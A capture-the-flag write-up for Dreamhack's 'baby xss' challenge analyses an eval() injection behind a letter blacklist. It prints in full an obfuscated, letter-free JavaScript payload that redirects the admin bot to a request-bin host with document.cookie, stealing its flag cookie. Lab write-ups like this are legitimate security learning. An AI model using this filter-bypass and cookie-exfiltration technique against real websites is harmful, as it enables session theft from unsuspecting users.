---
title: "[Dreamhack] Baby XSS"
date: 2026-03-02 15:00:00 +1100
categories: [CTF Writeup, Web Hacking]
tags: [dreamhack, xss]     # TAG names should always be lowercase
---

## Challenge Overview
- Challenge: baby xss
- Platform: Dreamhack
- Category: Web — Cross-Site Scripting

## Source Code Analysis
### Endpoints
The application has the following routes:
- `GET /music` - Music recommendation page. Takes an `age` query parameter and passes it to the `recommend()` function.
- `POST /save` - Stores the `age` value server-side without any filtering. Returns a random hex ID.
```js
app.post("/save", (req, res) => {
  const id = crypto.randomBytes(20).toString('hex');
  saved.set(id, req.body.age);
  res.send(`saved! Remember your id: ${id}`);
})
```
- `GET /saved` serves `saved.html`, which fetches the stored value by ID and calls `recommend()`.
- `POST /saved` returns the stored age value for a given ID.
  ```js
  // From: app.js
  app.post("/saved", (req, res) => {
    const age = saved.get(req.body.id);
    res.send(age ? age : 'false');
  });
  ```
- `POST /report` lunches a headless Puppeteer browser with the FLAG cookie set, visits the provided URL, waits 500ms and then closes.
  ```js
  // From: app.js
  app.post("/report", (req, res) => {
    (async () => {
      const browser = await puppeteer.launch({
        executablePath: '/usr/bin/google-chrome',
        args: ["--no-sandbox"]
      });
      const page = await browser.newPage();
      await page.setCookie(...cookies);  // FLAG cookie, domain: 127.0.0.1
      await page.goto(req.body.url);
      await delay(500);
      await browser.close();
    })();
    res.end('Reported!');
  });
  ```
## The Vulnerable Code
```js
// From: views/music.html
const recommend = (age) => {
  if (age.match(/[a-zA-Z\\&#;%*$=]/g)) {
    alert('nope! ⊂(・﹏・⊂)');
    window.history.back()
  }

  eval(`msg.innerHTML='This is recommended album for ${age}-year-old.'`);
};
```
The `age` value is injected directly into `eval()`. This is a XSS vulnerability. 

### How `age` gets to  `recommend()`
There are two paths.
#### Path 1: via `age` parameter
```js
// From: views/music.html
window.addEventListener('load', () => {
  const url = new URL(location.href);
  const urlParams = url.searchParams;
  if (urlParams.get('age')) {
    recommend(urlParams.get('age'));
  }
});
```
Visiting `/music?age=VALUE` directly calls `recommend(VALUE)`.
#### Path 2: via `id` parameter:
```js
// From: views/saved.html
window.addEventListener('load', async () => {
  const url = new URL(location.href);
  const urlParams = url.searchParams;
  if (urlParams.get('id')) {
    const res = await fetch('/saved', { method: 'POST', ... });
    const result = await res.text();
    recommend(result);
  }
});
```
Visiting `/saved?id=VALUE` fetches the stored age from the server, the calls `recommend()`

### Exploitation
We are going to break out of eval() using `',PAYLOAD,'`.  

The eval string:  
`msg.innerHTML='This is recommended album for ${age}-year-old.'`  
Exploit:
`msg.innerHTML='This is recommended album for ',PAYLOAD,'-year-old.'`
In JavaScript, the comma operator evaluates each expression from left to right and returns the last one. So this becomes three separate expressions:
1. `msg.innerHTML='This is recommended album for '` assigns a string to msg
2. `PAYLOAD` injection code
3. `'-year-old.'` just a string

But we do have to just JSFuck since we can't use any alphabetic characters. We need to make our payload using only allowed symbols.

### The Paylod
The JavaScript we want to execute:
```js
location.href="https://[REQUEST_BIN]/"+document.cookie
```

#### BUT
There was a problem when I tried to convert the payload into JSFuck string. The string became over 50,000 words. When URL-encoded as a query parameter, this exceeded HTTP header size limits.

So I found something like JSFuck but shorter one: <https://js.retn0.kr/>
![](/assets/img/2026-03-03-jsfuck.png)
Set the blacklist characters according to the filter

There is another step.
We have to change `+` to `%2B`. In URL query parameters, `+` is interpreted as a space. Since JSFuck (JavaScript Obfuscator) output contains many `+` characters, they would all be converted to spaces and break the payload.

```python
a = "[][(![]+[])[0]+(![]+[])[2]+(![]+[])[1]+(!![]+[])[0]][([]+{})[5]+([]+{})[1]+([][[]]+[])[1]+(![]+[])[3]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[0]+([]+{})[5]+(!![]+[])[0]+([]+{})[1]+(!![]+[])[1]]((![]+[])[0]+(!![]+[])[3]+(!![]+[])[0]+([]+{})[5]+(17)[(!![]+[])[0]+([]+{})[1]+(([]+[])[([]+{})[5]+([]+{})[1]+([][[]]+[])[1]+(![]+[])[3]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[0]+([]+{})[5]+(!![]+[])[0]+([]+{})[1]+(!![]+[])[1]]+[])[9]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[5]+([][[]]+[])[1]+(([]+[])[([]+{})[5]+([]+{})[1]+([][[]]+[])[1]+(![]+[])[3]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[0]+([]+{})[5]+(!![]+[])[0]+([]+{})[1]+(!![]+[])[1]]+[])[14]](20)+'('+'`'+(17)[(!![]+[])[0]+([]+{})[1]+(([]+[])[([]+{})[5]+([]+{})[1]+([][[]]+[])[1]+(![]+[])[3]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[0]+([]+{})[5]+(!![]+[])[0]+([]+{})[1]+(!![]+[])[1]]+[])[9]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[5]+([][[]]+[])[1]+(([]+[])[([]+{})[5]+([]+{})[1]+([][[]]+[])[1]+(![]+[])[3]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[0]+([]+{})[5]+(!![]+[])[0]+([]+{})[1]+(!![]+[])[1]]+[])[14]](20)+(!![]+[])[0]+(!![]+[])[0]+(25)[(!![]+[])[0]+([]+{})[1]+(([]+[])[([]+{})[5]+([]+{})[1]+([][[]]+[])[1]+(![]+[])[3]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[0]+([]+{})[5]+(!![]+[])[0]+([]+{})[1]+(!![]+[])[1]]+[])[9]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[5]+([][[]]+[])[1]+(([]+[])[([]+{})[5]+([]+{})[1]+([][[]]+[])[1]+(![]+[])[3]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[0]+([]+{})[5]+(!![]+[])[0]+([]+{})[1]+(!![]+[])[1]]+[])[14]](30)+(![]+[])[3]+':'+'/'+'/'+(33)[(!![]+[])[0]+([]+{})[1]+(([]+[])[([]+{})[5]+([]+{})[1]+([][[]]+[])[1]+(![]+[])[3]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[0]+([]+{})[5]+(!![]+[])[0]+([]+{})[1]+(!![]+[])[1]]+[])[9]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[5]+([][[]]+[])[1]+(([]+[])[([]+{})[5]+([]+{})[1]+([][[]]+[])[1]+(![]+[])[3]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[0]+([]+{})[5]+(!![]+[])[0]+([]+{})[1]+(!![]+[])[1]]+[])[14]](34)+(1/0+[])[7]+(![]+[])[1]+(![]+[])[0]+([][[]]+[])[1]+([]+{})[2]+(20)[(!![]+[])[0]+([]+{})[1]+(([]+[])[([]+{})[5]+([]+{})[1]+([][[]]+[])[1]+(![]+[])[3]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[0]+([]+{})[5]+(!![]+[])[0]+([]+{})[1]+(!![]+[])[1]]+[])[9]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[5]+([][[]]+[])[1]+(([]+[])[([]+{})[5]+([]+{})[1]+([][[]]+[])[1]+(![]+[])[3]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[0]+([]+{})[5]+(!![]+[])[0]+([]+{})[1]+(!![]+[])[1]]+[])[14]](21)+'.'+(!![]+[])[1]+(!![]+[])[3]+(26)[(!![]+[])[0]+([]+{})[1]+(([]+[])[([]+{})[5]+([]+{})[1]+([][[]]+[])[1]+(![]+[])[3]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[0]+([]+{})[5]+(!![]+[])[0]+([]+{})[1]+(!![]+[])[1]]+[])[9]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[5]+([][[]]+[])[1]+(([]+[])[([]+{})[5]+([]+{})[1]+([][[]]+[])[1]+(![]+[])[3]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[0]+([]+{})[5]+(!![]+[])[0]+([]+{})[1]+(!![]+[])[1]]+[])[14]](30)+([][[]]+[])[0]+(!![]+[])[3]+(![]+[])[3]+(!![]+[])[0]+'.'+([][[]]+[])[2]+(!![]+[])[1]+(!![]+[])[3]+(![]+[])[1]+((0)[([]+{})[5]+([]+{})[1]+([][[]]+[])[1]+(![]+[])[3]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[0]+([]+{})[5]+(!![]+[])[0]+([]+{})[1]+(!![]+[])[1]]+[])[11]+(17)[(!![]+[])[0]+([]+{})[1]+(([]+[])[([]+{})[5]+([]+{})[1]+([][[]]+[])[1]+(![]+[])[3]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[0]+([]+{})[5]+(!![]+[])[0]+([]+{})[1]+(!![]+[])[1]]+[])[9]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[5]+([][[]]+[])[1]+(([]+[])[([]+{})[5]+([]+{})[1]+([][[]]+[])[1]+(![]+[])[3]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[0]+([]+{})[5]+(!![]+[])[0]+([]+{})[1]+(!![]+[])[1]]+[])[14]](20)+(![]+[])[1]+([]+{})[5]+(20)[(!![]+[])[0]+([]+{})[1]+(([]+[])[([]+{})[5]+([]+{})[1]+([][[]]+[])[1]+(![]+[])[3]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[0]+([]+{})[5]+(!![]+[])[0]+([]+{})[1]+(!![]+[])[1]]+[])[9]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[5]+([][[]]+[])[1]+(([]+[])[([]+{})[5]+([]+{})[1]+([][[]]+[])[1]+(![]+[])[3]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[0]+([]+{})[5]+(!![]+[])[0]+([]+{})[1]+(!![]+[])[1]]+[])[14]](21)+'.'+(([]+[])[([]+{})[5]+([]+{})[1]+([][[]]+[])[1]+(![]+[])[3]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[0]+([]+{})[5]+(!![]+[])[0]+([]+{})[1]+(!![]+[])[1]]+[])[14]+(![]+[])[1]+((0)[([]+{})[5]+([]+{})[1]+([][[]]+[])[1]+(![]+[])[3]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[0]+([]+{})[5]+(!![]+[])[0]+([]+{})[1]+(!![]+[])[1]]+[])[11]+(!![]+[])[3]+(![]+[])[3]+'/'+'`'+'.'+([]+{})[5]+([]+{})[1]+([][[]]+[])[1]+([]+{})[5]+(![]+[])[1]+(!![]+[])[0]+'('+([][[]]+[])[2]+([]+{})[1]+([]+{})[5]+([][[]]+[])[0]+((0)[([]+{})[5]+([]+{})[1]+([][[]]+[])[1]+(![]+[])[3]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[0]+([]+{})[5]+(!![]+[])[0]+([]+{})[1]+(!![]+[])[1]]+[])[11]+(!![]+[])[3]+([][[]]+[])[1]+(!![]+[])[0]+'.'+([]+{})[5]+([]+{})[1]+([]+{})[1]+(20)[(!![]+[])[0]+([]+{})[1]+(([]+[])[([]+{})[5]+([]+{})[1]+([][[]]+[])[1]+(![]+[])[3]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[0]+([]+{})[5]+(!![]+[])[0]+([]+{})[1]+(!![]+[])[1]]+[])[9]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[5]+([][[]]+[])[1]+(([]+[])[([]+{})[5]+([]+{})[1]+([][[]]+[])[1]+(![]+[])[3]+(!![]+[])[0]+(!![]+[])[1]+([][[]]+[])[0]+([]+{})[5]+(!![]+[])[0]+([]+{})[1]+(!![]+[])[1]]+[])[14]](21)+([][[]]+[])[5]+(!![]+[])[3]+')'+')')()"

a = a.replace("+", '%2B')
print(a)
```

Now we are ready to submit the payload in the report page.
`music?age=',{JSFuck},'`

![](/assets/img/2026-03-03-report.png)

#### What Happens
1. Bot visits `http://127.0.0.1:3000/music?age=',JSFUCK_PAYLOAD,'`
2. Page calls `recommend("',JSFUCK_PAYLOAD,'")`
3. Filter checks for alphabetic characters -> none found -> `alert()` doesn't fire
4. `eval()` runs `msg.innerHTML='...for ',JSFUCK_PAYLOAD,'-year-old.'`
5. JSFuck decodes to `location.href="https://REQUEST_BIN/"+document.cookie`
6. Bot's browser redirects to request bin with the FLAG cookie in the URL

Then you can find the flag on your request bin
![Flag](/assets/img/2026-03-03-request-bin.png)

## Key Takeaways
1. URL encoding matters. `+` in query parameters becomes a space. Always encode as `%2B`.
   Common URL encoding pitfalls in query parameters:
   - `+`: interpreted as a space
   - `#`: interpreted as a fragment identifier; everything after it is not sent to the server
   - `&`: interpreted as a parameter separator
   - `%`: interpreted as the start of a percent-encoded character (e.g., `%41` would be decoded as `A`)
3. JSFuck optimization tools exist!! <https://js.retn0.kr/>


